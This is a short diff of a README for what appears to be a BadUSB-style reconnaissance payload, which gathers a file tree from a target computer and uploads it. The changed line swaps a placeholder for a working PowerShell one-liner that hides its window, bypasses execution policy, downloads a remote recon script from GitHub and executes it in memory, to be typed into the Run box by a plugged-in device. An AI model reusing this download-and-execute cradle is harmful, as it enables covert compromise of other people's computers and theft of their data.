@@ -40,7 +40,7 @@ Along with TREE list of all files in the target computer is gathered and uploade
 * Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
 ```
-powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
+powershell -w h -NoP -NonI -Ep Bypass iwr https://raw.githubusercontent.com/I-Am-Jakoby/1/main/ADV-Recon.ps1 | iex
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
